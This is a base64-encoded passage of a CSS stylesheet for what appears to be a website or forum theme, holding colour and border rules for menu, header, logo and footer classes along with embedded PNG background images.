cWhGNEpVUi9xY0pkdy9zM0RVQ1ZkVWdXZHczdzBUWEJvMDZKUnNZbVlKMjhGS1dDT3JtQ0ttcFdlNmxEM3VlaktHdEk5YlFUdWFsMWRQT2lGQmtRL0JocjlpMkZSa0NMQzgzWnhUMm84WXYxck9oN2RhNFZ5bWJzTklHUElzakRQTWJkZHFvVEtPQk9CVFlCc1MycU5PRTloa3NEZXB4dUN4UE9IOGd2d1ZDR25WREc3Uk5RK29WZmVFS01GWWhJcCtYaFBNbmVtbCtsaHlYeFpQdSt4RlZXQ0ZiVndhQ0FBL3BLSTVEQXZweW5JdFphMVZLUkdoZ2hDL3NhTVdsblR4NFQyaFhXd292MWpTOERGaHVIbEVnUHA0UnB3dVc3WUNYZE1qUjYwNjRJYXNBV1Z5OFRSZ0hTby9LYW81SFF0a0RsTkk1SW5nYWRHRnd4OFFuWW5xSm1XYjRic0VOWVdOQkM2YjlhVnMwcmtIYkRWa2hvdStKMTZ4YVd5V0h5YUNBdnRvbVp5WG9GSlB1SDNuT0JlWnJRWjE2ZjNxQWc2aEZrZVEyQnUxdDlxYlBiRGdvQk15cmZWdE9PUy9zL01jcUQ5SzFnRE9QNTJJL2pzcElFUHBkK1BaMXJ2UXhjV3l1Tk9JM0NkdGUrK2JzVEtiSjQyU3A3a29Bbk1Gano0ZnlzZWhEb0NLUWc5TW9ubUtGUW1pRGx4QkthRzlBRExsMzNaQUpEZlI2MDIvaXZ5TDRqSVV5cklCV2xGcnFXaGtjbDBIOGhBQWt6cUtjeGVhRDZwL2JpR2cxVndJM2hQa0l1UkxGelRrOWx6TEFrc0Ftb05mZy9zZzhhSGhsZm5qNHg3d0RjZnkzTkg4R05rQThZYklOd1hGWnJMVU9YSDQ3Z0Judk9GZU00bHZlUUpYV05LRGNyVWFFUk82THdldmNBQjNhK3ZrZGNtdzhRNEY4K0RhL0pqcEF6NEh5aHZkY3kxVFhtWjEwbEc0SHFRVENBd0VReVIxU0UwSW53NTNVd2syZWRVS2F0a2lmSGdUVmtqTUduVExtbGYrTkE4YUtTMnc2ekdPVlN2VG5DT1RsSTZmL1plVk9peDhrRTE3YlVrZjNlQUtPNVBvdnRxOENXZXdOd012NnBwZndUa3NFMG4xdm1TV0pOdnk4bDlvRFVxMURnTnFGRTVKTTIvUWtOMFRyc1hXUUpIYUxoUmgzVUNVK1BQN1MwOVdrN2x1Q1ErclhScmdKZmZqZ25jSlhOdy9rQVFEVnByUXRxeklBazhwdC84SlhJVHVNT0dsa2djYndDb0VqRUVHRWhMZzdSb2lXZGtYdkVXbHg0QzBXbFVlSmpVcTMvbTNDL2tqUUhNVGFxZ2N5TGlFdVFtTEtraUlGb0lQM3RPR25hc21iSWxWRnhFSVdHZS9yZGtNN291U05nSEtkQmF2cGMrTzcwVVhHOUoreWZVY0V3UW9FR2pna2drdGxNamcvMXorUHZvNXFDS3hJbFA1M0gvbmlvRnR4Nm9jaTNnNDB0TnpwOFRsZUhyaXJmZWlLNkMwSkIvS3VYc3d3U25Tb1ByNEQ1b3VIakRvOHVBSU11dkd4bVVLekM1V09aQnJ3WEtBUHZScUZBWm9reG4wdDNBZlZDZXNBSldUN1hyVUlPWUp2SWYwc0IwM1JXOXd4a3ltajVLYmFVSGFBRFNNT09Qd296a1B1QUZqY0QwZmx0VVIxb2tPMjhNdGZOVzlNd0lVSEZ0cC91YXNQeG9HeUxIUzVpNHV0bE5CSmdhNXVhQTdobEg0QVhNZnYyNTBPREQ0a005cG5vM3h6dWpNbDFRNDRCQUhVOW91YXpkbCtvWElzWTlISWRuMVAzWkY0ckFzekNCMFJEODNBbVU1eEtCWGQwOHgrUVA3M2RNWU82N3ZoVVZmMDRFRzV3WDVCMGhHSUFXQmNRbVFvNGQvdW94dFZBenFqejhPTFRhVkRnd0h6blJpR1RMejFRaG5nbVRFMXFSYTJTcWNDTWkzUUFtS1ZwSWV0QVYrY3BqS2dqNDJlcURYYkFHNmxLejlDN1FmUkQ0Z1BrbVozZ0FlYWIwb284Sm95c1ZydjM1ZGtRWmlUZ25SSXdUZWo2K25WNGl0UDhZR3V0SFllN0RMNXFTaHVYUFM4L0haYWRHZzV2NkgwWERCZGVnVGZzN2NCTitFdWRCK3lBR3NKRGx4czM1SzRMQWlCK3N5NU1xODRBMEpUUTh5S3hjREI1dldNc3c0UVJHNHpnblRjUExnaW9JR2d1UW5TOVVrYVowL1JPMDREREpscUtIWUlJNHdxM0RkYzlCbW1CWlNBT0RySC9JSUpJak9JTUdEWkhqSWxWNFRtQk5BOFBzN05EejFvbWdvUUFQTkI2MHF4a29va1lYV29wM3QxeXNoUGFaV1ZWSkNNek4vZ2VhSmo4bkdoQ1FGZlVUWFVobEtyTW1OWUNIVk41VGFOTjdRVCtmeTRteVI2T2lFMWhwNEQ4c0JNWnovTndPbE9keXNlVGxFaUR3TGpVd0FsRFRtNXNLTUwxVjV5WXBTQUdOQzAySHlvakFWY05ob3ZFSyszb1Q2SnBSQlJ0SVAxU1JldjVMaDBla1Z6Q2hpTlNJZm9NMGFEeTRieUpKM1NkcllLYXNBU0xUR09ZbmppTVRCeFY0RGorYVpPSCtObzdoRlZzUThPVGl4bG9BMGRaV0JId2d2RlFRQ2xGQStLY3d0VWsrTkR6RGk4TGl3RG1vSFBnL3BuTGd6MDdYVnhZSk41OVZuSUJrN2VLY0I2TGhRZ00xbHFZeUFsYXFHdzRCUVM3RE5VMEdxbkFJRHNLWG5rc1pZR2JqdnVpeVU5ZHZVOFVib3A4ZVdwd3FTNDhhQWw1ZThoa1hKQXQvRnJvZkdncThyN0hESjArbWdhdGNRK2xkUWdHZ08wZFd2Z2EwUG1UVmo1VUVYcFBJRFBLWW9PZGJ2aGNtTWpLOVF2dXBUbldlZGkwRUhrWVN1RStXVDhqMEIwckNiRVo5N21xSkZVanc0STIxR1hBNmtHVjlYcnNPTlBBREVCZ210RVo2bXdhK0tEUndnTUM3OW9IaHA4MlYxaUxDY0ExSGhjbnRkbnBCODBkdE5xUUtYSE9RbDFkWVpkS2lVdEdMaFRrN2xpYTE4aFVSeElGbTQ2UkRvankwSUxUSFZkbVNjeis1ei84dkphRzVENHZqcUlJQ2FDU2dlWGx3Nk5mdVdnTnpIMUFtbHZEclUrWEI4VHlaaEJvblhHTmQ2VWsra0drRWtCWVpJVWtGY3FqSU9Na0krWlVtQjVHNFAwelg0NzQzM0FScWdPWkVQaEFIR2hMa3hmM1JFTUpjbmt1ckJjOEJrM1lhSXdOSU43a2h5MEs2QUxnbXpoblE5V0Jad0pwQWVYSExRRGFXSURDMDlJZ3FENndIV0Vpd0N1WjBQNVRKK0VaMGZ5TW5zRzQ2UXB1Q3dMWiswSmVpSDdRa0c2a21QVGNuc0ZicDRacW83cHpXNDY3b2duclFEaE5Ua1ltZUF4SG8zcXRCVUhOSlVvN0pjaXVXZ2k0Yjk0SE5yaXNpVGRjWWNNRWowWERmZEI5ZGU4NFY3ZTlvV1ZNOEtJWEdXWDkyTktpZmpHQWN2UmRvWUVUTUF3RXVLbnV1Z1kyQUZUZWhuMm9FcHZMYXFRazlwc3FCZ21kVVdOdzNnMjlJRld4S2dveW9FaHlmaXc2TTlCR0UrS0hCbzQ2b21DUHBCMDZnMWVIWDBBT1BxQUdBOXA3Q1pFUnI5MUw0Z1BEeE9NbGdOcElaQ1kyTC96eElSRDdZRWc4T2Z4WDkxT2dXZ3BrRms0YTBKRXg2YU82MTMwemFreE9Zem9NV2hSL05FSW1XRWVVeEFiTGc1WE8vVVo3SG54M2FDNUhpUzJYV3BnTHV3RXlGUnFDWEJ4bjQ5YWtpTHFTMlJXWVBKOXRqNFNjakdZYmZqNDVid0RlVjU2SVI1UGVBOVVIRUc5OVVNcHlJYTJveThDNHZkTkVoRWc2NVlTWSs2MjJPZXlxdUR6bEIvam1WSFk1WlBkMGNBL0R5UXR5QTVGUEJQUmVXU2t1aTNBQnBjU0hKZ2tkVDhSeEUzUG1uQ2RlU0JTMGJyMGtFZzJYRkt5dzBFUy83TVUralZNZTBTWDRlRVFiaHNKK2VqWnZuRDZtODZEME5aRVZlRDFhQS93dFMwUEZqYXRTckZuOStDQTJNRDVwem1lVjlxZDcwTENPbUp1UUxMMVVhSnVvajNBVWNUMFJGNUx1dFo0SVJjWGxHR1h4L2tvL0xpZm9LK1ZFZU9BOW1OVjJ2cFlKWXFLZDNaZG1oUHNNZGVqTUlsaWU1YlR3aXI0Nmplb1JNc04xcFlDSmNuMXFhUHBsaVBWcmpmd2Q5eERFdlg2RkRMWEwva2pnZkdWcHFlNHYrdy9mc2Faa3JiZnJkbyszOGZ2U3kra1Jzbk45Q3RKYTJuZEIxMmdkMEhSd0QwUDQrYVlnZXJadDBMcnB3K3VwOGRHWGgzdW9ZbkZzdWkrdno3ZFgxdmpZZGkzNXFtS1RkY25CZi8wcUYvejdXQW1WRklqRmtYY3RBc3FJUlV2M2hzRmdnSXkrN1MrSTZKK282SkJ1NmtMZ2NseXJ5UGhWMmRLQmtLTEt1a3U5S0pTRExNVFVnQ05MQjMrNlZ5K3Q3WTMwaWordlNOWEdkRnFFTEdiWHpUK1QxY0V3cHdmdWJVR01JOHFDaUl3SU12dzdCRzFST0JHbVEzZFFqY3RTb1FURFBiU0xHOFljNG41OEwwUFZhNW1BSHZGdkVHUkFjZzYrUElZbzRUaU02em9NMU1NZTk2WGMvWWpoZ0h6R1BQK1Q5MUwxSjFnNDFrcmJqaitIKy9UVmpNem9HOThleFBmUTdGNHZXNDVIL1BPSEhUOW5zdHlrZmhUWCtRN3NYQm5UUXN3K1JhY2kzemNVK09nYkJQWmpXNjIxL2ltMWozRmNycDlISFBYUWplY1JVZHJUZzhISFF6WFluWlNxY2g4YzJ5RjJBYnh6UTZJaU13N1Jmd0J5Kyt2ODlTTVBqbEpHN0FOODRqaTZVMlRHUnVFTm0xM0dweVB1TTg1Yko0LzhJdVF2ZzRlR1JIWEVIekYvVzJQSkRqUzArMU5uaVBYQW8xK3AzamMzZkVsN2dHSFdjZVl6OC9ZNk9leXBNVEJ5Ly9FakhmOVNPK1lqcklBRkNYaXQwRGJXdThXUDUrWi9xdEZiWHI3UFpzKzBHQnN4ZjRYbTErMzBRMTUzK1lqZU41ODlyL0xuV1pjVFB0Y2o3UWNvcnkyZE8xMXk4T1dTelg5RzNIdXpQWEx4U1pWbXpYRXV1NWY3bEoxRnVZaHRkOTNXTkRlL0dsOEgwSVpYMUd5bjN1cHlOOS9YQmtQMVRQWENmMGUzZ2dBN1VsY1VIUTA2VTNhOTJlV1pQUkoxWVJOV3Z0eWo3OFBuWWhtdHY3aGNzYnp6WGpPU1pVWDFiMXlmWFBUNkk0L0h1K2ZIdlhQVnZVK2ZWOGNleU93N3ZrWi8zc1dZNWZsTS91Vnd2SkFkZTZSeW95M1dOVFora2NNUGlEcGc5RndYQXZwWVpZNVV3Vm1YK01rR2N4WWNxYlhNYzkyK1pDaFF2VXdpSDQrZnZrRWlPL1NWeDN0OFZObjBtQ243K3JtcS9EbUg1UjRYTjZKNXpGT1NYbXR3dTdqdC9uWDFzN1JDWlA3L2I1WisvZG93K29rbzRmMDE0SHlIdjd5UXZTUG5KT09acmxhMFdWWHFKRlRhNXZ3bCtvY3h4VFR5bjlacGZ5L3grYURoUllkaENsWHVaeXFQQ0JyZmpBMm5qQjNRUGVoOGdNVnRHdkxOWGd1aThyUC9RN2tQUGRLS050aHJlYUxyTDdvMjk3Q2EvZ0FTb3VCSDE1aXRrQ0wvVHhkdUs0NXd5VzN5dThqbzVwVG8ySWFLREtPTDkyTyt4K0NMZXo1VEtmZkpZbFAwaTRuM2llRTUyVWpadDFUWDZ1TTdyTGZ2SDhjN1c1VW5IUFpjY0FMZmVLdzZJY2tWWlRDd05WbVlDQTIxMFJQOEZraFdzbUwyUjJVZ1BxRUwrVzdRZnR5cXl5VlBqUlJaS2JQYXV6UGV2L2k2eTRhUE5pOEt4N0t2OWZvdmZneDM0aytjVklvSzQ3L1NWdmJJa3dld0Z2YlQvN1BJdmZzTVFTamN4cGk4cXp2SlovQ2JrN2Yyd2tUT0lJalZZS01OTjhrQzFRR1grdTZQTXZ4YlorSWw4emtLUjlYK2lTdlZabENQT09VNFJTT3YvUU8vc0gvdDlsdjhVV2UvMjVwMTBTZU11UHNuNy9GRmk3WXQxcmRHaHNsdTZ5Kzc0d0YxMnc0ZXVjcEZ5NFB4TG02bHIrbGNQWldOaFAyZitJUnlIU1BKK0FzZS9qRGorc3ozbm41ZkRtN0x6UE5Ubm1kbVlGVXBjWHM2ajkyVjI1QmltdWhXQlVVblVUWlFnSzdsV0w3TjFwY2JxNTh1eVlNWDIxZGZOOGZ6QlA2S2ZNdmdpSnlnb3FwQWdZYkRBcTV6MG9YdktTbXJLT0tJS3paYWxyUWk4ZUZ0ZFZ3cjkrZmgvcXN5alIyNWk0TDZCNDcrR0swZ1BaRkVWMVNpYjVaOGxkbkpyVXpZZEl1R2F3RVo1czFXQmpZM3lPcm9rQ0wrZzhqKytrcHpBdzUrcm5LZzJ1VUhzay90QjdkYzhxUEI3NEowZkhXejJ6Yld5WTJiWjBUT1BIUzRJbCtFeFdTbWZpY1QvMmNzUFNtR2ltWlZvTEpaa3pheFc5dU50Qko2OUZ2WE0rbjQrTzQ1WHgxb2FKTmV6ZEc1VStidDBjWURYbzRmQnNwaS9GN3c1dXB5aDdpWTljUHhFMDA2R1pseFJ5OHZ0OW9Kb1ljeVhxQXBnOVJkcDJSOU40ZW5sZlNtemh2RkI2dGxMcmNETmh1Q1BEWUdoTlpWSnN2aFlEcmR3U1ovdlovanlodGJUR2czUmVyck5jL0hDSGZKK0VmSU83dGNDQk5Zcnh2THZZTm4wa0Q5cnlMSXVTMWd6TDhSem52d0FVN2pHMnRjcnZCRkVaVHkra2R5TkdCR3gxaHJZYkZTb3NnMWxaWU81eTh1WjNqSHVqVXJja2dOWVVDRVh2T3pLOWdZSHBIcnJmaTljYmxrUFREbFVHV0gvdXM2UW00VDdyUWxzeUQzL0dMNlhUc2pRKzdFUWt0ZGprM3dSeCtzSWFIdjl2YW56UDFSWXRkQmVsOTJTM3RudzE0eUtKK21Cbld0VjN1cUd0Sk1xdFBmU2pINVVDWnJST3RtcDRrMWZiaXJYNE1jNmYyblF3cUZDQUlFMURSeW83Sm9HaGkvRXpjL1BRbXNEV1FvQ2xRSysxalRpUmNPVTZ4ellaeUVVTGJ6UllLbks5NlVjSnJCUk5pamI0MnNHZ2Y4b0I1OWQwOEJUV1daajhwMWgyY0E2T0hrQTM2ektqdThtTDRQeG95clhDclp5WG1rRTV2NGFWYndXUmoyUnF6U2o5OWk2TG1UZ1pVZlBQN0dablY4M1pYQjh5ZTdiNFozTjZkcmNpakhsVUdWS0x0eUFHcXN4K1pwb0RGQ1BtSzZCdFh0YU5mQ2JpUGRqSWVUOGpkWWdHKzhxanNDdHE5V0FKUnBTZUl2aU9sQ0ZoZ25jS1JYMlRHRHVyNzROVnU0QXFhaUF1emVyckZHdXJJVmZXWTZGbHF3VUd1c1hEd0lmMzdhMG1EcUJJelR3NGxPRlh6UFR3MHNjaysrSkZuMU1mdmZKL1dBREZEUXAzYVpnRWcxOGNtZEQ0Slh4VWxGNWk0WE5jL1U1Z1V2V0NxQnJZRmdnS08vUno5Q09RaXVXRDVJUDNoY2EyR0hXZzhBUHF1dDN4Ylg3ZGZHL1hwUmxYdWlLc250V1liMTdSQ3JIODNFeitGZEgyVUdqVXlNMHVBOFh3L0hNc0lCZWlVWVdza0JydXl5MHVhVStDQUk3M28vRkI1NWJDQitsc1UxTW5tM3FyMUo0QVMxTVpUbCtXT2V1dytpWDdHNWZxb05IdnhpQkNyMlF5YnllUGhkRDk2WVc4Mk5kS1lqb3czdW9iRjF1T3N6ZU9hSzdMOTArQ3pUdytGR2R2M1FVa3Mxa1NvTXB1ZzZvRlR5K1U2RUdxQm8yNWZUVzNXR2k2eG80MUdJVHdhYm9ZdmtjMUJvZ1BDcnNsQnJHcGhHODBEV3crZkpoT3ZLS2pHNkl2OHE4VVJqK2xLMzdiUFJvRThRS1ZEUW1mT0FoV1ExVDBucnc2M2pnNmxLUWhJamFvdXdRU0t1ZEU2YTFxNUYzbWRHY3dOUVF0ekNwd1NkM3JBWFhob1V4ZWx4bGVwQXBaSzQ3Q2V4NFAwNE5iRmdCNitQZFFTeUZ4c1VLYjdoZDlRanZEQllObEdLaEVIKzluUkM0ZWJIS0k4Q0JoOUlMNHFPSXBQSUFsSzY1RE8wQjgyZnlSQkJsK0xQanBSb210TmtJb0o4T1hWZ3VreWtOVUxIZy93Ykk2TEFnSUhQM1N0aU0xald3R2JpQWhrUzNCcnBlTnZ0eExKSGlTMVVFeDR5WDJJdlV3QVhlM2JEOHZicTJEQVkvWlV2aGpOTEFvcEpodjNnMk5Kd21nZWR2cXB5WXBZSWM3L3pLVFJTVVErOWFPQm9OS3dKV1ZQTnloVnRCWnZCU1Z4TEtGeGIzQ2RZUFZlNUpDR3cyREZZQzAvVkQ3a3RDRGN6TDlySFJxMkVHZnhHNC9ISExLWVhUbmhBSVVsbUlkWEtuemd0NTlXYzRJTEZ1SVlsdzhGdngwbHkyLzlRd29mVkdBSTNJOFkwYWo4UWk4cndOZ1U4d0Y5ZTdTaUFLSHVnT3MvZ3ZhSHlzQkRhUFZmTEtiZ2RFZE1QeGdTSi9odG5MNERYN3BnK3Nsd0dWQzB6V1BwbXM4QzJoS1RNVCtGRkVOeEtlbGF5VDZSdmhKL1BlQnUyckN1Z2FFbVczMmRiL01helIxK1VCTS9xcHBleGVDaE82YzZ2QzJsYzNzUmJiTmFheVB6NFFjekRLM2UwRHUzemFzQWEwQldPalRHNGI2dWMyM1c3bWM2aDZ2QlY1c3hCNDhCQ1YwT2plMERRRGI1R0p3RENuclpXUGlZREU4cmNLcjRUT2h1SmxSSUZyRDg0Ymd3OHltSUtraXBmcFdqUWtqc0NVbWRDNTZHU0hXUXFOdVBoaTZRNVRGZVM5SzhycDhySGtmTmQzcTg0b05JN3BYdDFvSjZzRzFvSllJMWwyOE5saEZReVVyL3BjWk1VbEp2QXZHdUVzWFI0Z0ZTK25WeFZlSmkydHEyUDZYSldkVEw2aDhvTXZialdqbFhiOFlDazdhVUwzcERaYWs4Y285K1hmSllaKzZ3MkI3ZlZqbHhwWWI0ampORERLZmY0OFdQWTJpeUtxTzNUdkJHNWNxUEpvckt0MVl1VFQ4WURHRDhIb3BxMVNOeSs1eVJhS1Focys4T2E0NnRxM2dsK0lpcERtZVdBSkxKRzU4MGFrMFBHMDBMZDFtVFVWbEh0VDhDQmIwT2NNUmFFdExUeVBRdHZLaElrb2RFL0xiQXI0d0laRzE0Tlk3ZXRWYnZFTXVSbmU1b1NhTytJS1ZnSS9Dc3UwOFlHTDYzN2c0UzlWb1NWdmJxNk5IZ0JlZG05RnVhbnk0NWxWRnN0TFBlZko3V0RaVFY5VVpSQkx6dTc1d043UTZacDE5cnJxTE8rNEtIUllBeWYwZ1dNMHNJb282OXQ0TU12c2ZsWFh5WVBBdk1EMVRtN0xDMnBlcWJEYStYSmtRTVBXZFJRb2NOTUhkbWhnYUJBVmtsOStFZ2tHU1o5amdKa3hQNHR1ck00Tnd1MEtqNGlqa2dZcWtma2l5UlNjUHEyRkNXeG9ZRnMzaGU1dkJ2d2hlcVphWVZPeDlTaTBxUmw1TjVJazhCR1ZOY3hTYUhkRWVWZWtwYUw2WEVNRTFqUndpR3dJWWowVUJJYmxCVisxZlYwOHk4bWxKbytrUWpPM2I0aHlPNFlKZkxQQ1NlOHlveEVFblQ0TE50eGNBNk12OU9GbSsrS1RrZEZFSkJnOXFiREk4azRhaFE1cDRBUlI2QmpDais4ZGl0aU1FVkRsZmNML0dmZk5Vd1B6bDNtLzZ1elBWSnBoVThqaE1EeWNkMldhT1JzSkk1SER6UHdLdlNDcVhFZ293YldUUGdkUG5TVC8wOWFZVkFybHRSbHRObEs4a3ZEVVJ4WjhWbWNMTHpPeDdyaFRVbkd2eWFOTm5xd1poUTVVQUdoZ1ErWnUrVkJhUmtRUVMrNndrOENXS1BUNlhsby9zS2dzV2dJTnljbklsWnBheXE2SXN2dHNTWWhSQk9NNUE1dVpQT1p2aEF4anJadUpheTZOY0dpMFcxZU11bVVFc2RidlptZFJhSHNjeENUOCtIcURucmV5ZWJZQWdTMEpVSGxyNENwL1FVWVhoeVJtKy9ybUFkQ2kybkpja1MrSzlNeElBcit3UktFdEduaGNhdkorUVZVSmsycmdFYlN2aktoems4c1lFY1JsaUVpUHhMbWRDM1VyZ1VNdHRrclZJd0xvbWlYUXgveTNpQXNvYTZKUkNHWmlCUm9SMHNCNjBHMzZTUFFuaXZkUlRKVk9pbjVlTXdxdDdvWHNzSUVsU2pvb04za2w1cy8yQ1dVWDdzSkNRKzZNUmxNOTZWK1gvajV0VW5WSjc2STd2aGxzN0tiR1lKS1o5bTVNQzhXWlNtazJLT3YzWTFFSVNkN25aekVLQ2U4dDBMRHJkZWk1b1lFZGx1U3BFbmpkc3NpdUVMRU9WNXptUVZWcXNjMXhDSUNoejlCMTNmblRPZytHaU56YWtuRVBlWTAveGNnbVBxVHdkelhLUkhiTEpDRHc3S21xOFBLNlgwdmNiOE1vRkl3dTRzYzhGNk5UMkg4bDQvNmJjL2dvckNkUzNuZlY0SDd0TjN6bXliTTZneGtLWHhKa1ZXVW1YcWI0amY3c0kzeVQ1MFdkUTJqZzhQTmpqZkxCa01UbFp6VUNaclBQcGhWREJQdFpCT3d3Q2tlTVJyTGNoMGZINjJKa3oyTVpQS0t5NC8zWlJ0a3RxT3htVDJyQnNsdVdIR1ZTNG8zdVpnU2IzUDl2V1F4UGZTbmV3Znl0MUlLb00vZGxuT09aQ0phSjBVWDI4b1kyeFAxbnordDhlS0Q3L2NnNmczNTZPaFpCS1BFK2EzSTBrdnQ5enQ2QXVIVE12M3JaRjljRW5qOFR3dzJqNnZHUzZqRkdUUEg3L1J5ZVcyeXZCTzdkcS9CQ21XTmNKTVk0dmtNS1g3amlUSjdoR0hwWjhqaVlkNVZ6N200ZlhvQVlLb2lBQ0Q5UDNDT3cxb2JTTFg1RDU3KzR4NXdxVWxTKzhycnhRZUxHQisyOFQxVkI0RGUxOVZBdTVCZno0TXg3SmJ1eC9pU081eFZFeWp2N1dBMGZwK1NsWTFSQ1BrOUYvSUErZFNTK1kxM2hHa1paTHp5YStWWU00ZVBQcEs2ekxvZnFlajhmT3ZkWlBydTgvL2h4Z2pKNHFCb2V5N1Bwc3I4Vno2Y2F0blhaZlpUNFZGMlhoVHFHeTQreWVSOThmK3RycXJKN0p0NGgvOCt2VlJIN1g4bHllbGpoMjNXWGdBOURWUUhIaitINndXVi9KNGRBa2h3WWk3eXVUODczbzhhMDE3bE04emYxOWZFem85ejVXdGI3UU5uTE1wbEkvejVjankxcldZL3h2Sk9IR2VkU3kwcGdEdytQTTREY0JmRHc4TWlPM0FYdzhQRElqdHdGOFBEd3lJN2NCZkR3OE1pTzNBWHc4UERJanR3RjhQRHd5STdjQmZEdzhNaU8zQVh3OFBESWpQOEJEZURNLzNZWS9HWUFBQUFBU1VWT1JLNUNZSUk9KTsgYmFja2dyb3VuZC1yZXBlYXQ6bm8tcmVwZWF0OyBiYWNrZ3JvdW5kLXBvc2l0aW9uOjUwJSB0b3A7IGJvcmRlcjoxcHggc29saWQgIzAwNTA2NDsgYmFja2dyb3VuZC1zaXplOjYwJSA3MCV9DQouYm1lbnUsIC5waGRyLCAuaGRye2NvbG9yOiMwMDg0YjU7IHRleHQtc2hhZG93OiMwMDAgMXB4IDFweCAycHg7IGJhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQUVBQUFBUkNBWUFBQUFjdzhZU0FBQUFZRWxFUVZSNDJnRlZBS3IvQUFCQVVQOEFBRDFNOEFBQU9rbmhBQUEzUmRJQUFETkF3d0FBTUR1MEFBQXNOcVVBQUNjeGxnQUFJeXlIQUFBZkpuZ0FBQm9oYVFBQUZoeGFBQUFTRjBzQUFBNFNQQUFBQ3cwdEFBQUhDUjRBQUFRR0R3a2lEaVNrRnRYUEFBQUFBRWxGVGtTdVFtQ0MpOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgdG9wOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMwMDUwNjR9DQouYm1lbnUgYXtjb2xvcjojMDA4NGI1OyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzAwNDM1NH0NCi5ibWVudSBhOmhvdmVye2NvbG9yOiMyNWM1ZmY7IGJvcmRlci1ib3R0b206MXB4IGRvdHRlZCAjMDA2ODgyfQ0KLmNsaXB7Y29sb3I6IzQ1OWJiMTsgYm9yZGVyOjFweCBzb2xpZCAjM2YzZjNmOyBmb250LXNpemU6eC1zbWFsbDsgcGFkZGluZzo0cHggNHB4IDhweH0NCi5lbmR7dGV4dC1hbGlnbjpjZW50ZXJ9DQouZnVuY3tib3JkZXItbGVmdDo0cHggc29saWQgIzY1OTMwMDsgY29sb3I6Izc1NzU3NTsgZm9udC1zaXplOngtc21hbGw7IG1hcmdpbi10b3A6NHB4OyBtYXJnaW4tbGVmdDoycHg7IHBhZGRpbmctbGVmdDo0cHg7IGJvcmRlci10b3A6MXB4IGRvdHRlZCAjNGY0ZjRmfQ0KLmdtZW51e2NvbG9yOiM3NWJmMDA7IGJhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQUVBQUFBUkNBWUFBQUFjdzhZU0FBQUFZRWxFUVZSNDJnRlZBS3IvQURKSkFQOEFNRVlBOEFBdFFnRGhBQ3MvQU5JQUtEc0F3d0FsTmdDMEFDSXhBS1VBSGkwQWxnQWJLQUNIQUJnakFIZ0FGQjRBYVFBUkdRQmFBQTRVQUVzQUN4QUFQQUFJREFBdEFBWUlBQjRBQXdVQUQrSytEVjhUUVp4a0FBQUFBRWxGVGtTdVFtQ0MpOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgdG9wOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICM0MTVmMDB9DQouZ21lbnUgYXtjb2xvcjojNzViZjAwOyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzIyMzIwMH0NCi5nbWVudSBhOmhvdmVye2NvbG9yOiM5NmY0MDA7IGJvcmRlci1ib3R0b206MXB4IGRvdHRlZCAjMzk1NDAwfQ0KLmdyYXl7Y29sb3I6IzU4Njc3Nn0NCi5ncmVlbntjb2xvcjojNThhNDAwfQ0KLmxvZ297bWFyZ2luOjFweDsgcGFkZGluZzoxcHg7IGNvbG9yOiNiOTQyMDE7IHRleHQtYWxpZ246Y2VudGVyOyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVNDQVlBQUFDYVY3UzhBQUFBWlVsRVFWUjQyZ0ZhQUtYL0FBSUJBQUFBQlFNQURnQUlCQUFjQUFzR0FDb0FEd2dBT0FBVENnQkdBQmNOQUZVQUhBOEFZd0FnRVFCeEFDVVVBSDhBS1JZQWpRQXVHUUNiQURJYkFLb0FOaDBBdUFBNkh3REdBRDBoQU5RQVFDTUE0Z0JFSkFEd1d1Z01MbWVFaC84QUFBQUFTVVZPUks1Q1lJST0pOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXItdG9wOjFweCBzb2xpZCAjNWMyOTAxOyBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjNWMyOTAxOyBib3JkZXItbGVmdDoxcHggc29saWQgIzVjMjkwMTsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjNWMyOTAxfQ0KLmhlYWRlcnttYXJnaW46MXB4OyBwYWRkaW5nOjFweDsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoZGF0YTppbWFnZS9naWY7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFUQ0FZQUFBQlJDMmNaQUFBQWFrbEVRVlI0MmdGZkFLRC9BRUpDUXY4QVFFQkE4UUErUGo3a0FEczdPOVlBT1RrNXlRQTFOVFc3QURJeU1xNEFMaTR1b1FBckt5dVRBQ2NuSjRZQUl5TWplQUFmSHg5ckFCd2NIRjBBR0JnWVVBQVZGUlZEQUJFUkVUVUFEdzhQS0FBTURBd2FBQW9LQ2cxcDNCS0N5cG5TR1FBQUFBQkpSVTVFcmtKZ2dnPT0pOyBjb2xvcjojYTlhOWE5OyB0ZXh0LXNoYWRvdzojMDAwIDFweCAxcHggMnB4OyAgYmFja2dyb3VuZC1yZXBlYXQ6cmVwZWF0LXg7IGJhY2tncm91bmQtcG9zaXRpb246NTAlIHRvcDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMzMzN9DQouZm9vdGVye21hcmdpbjoxcHg7IHBhZGRpbmc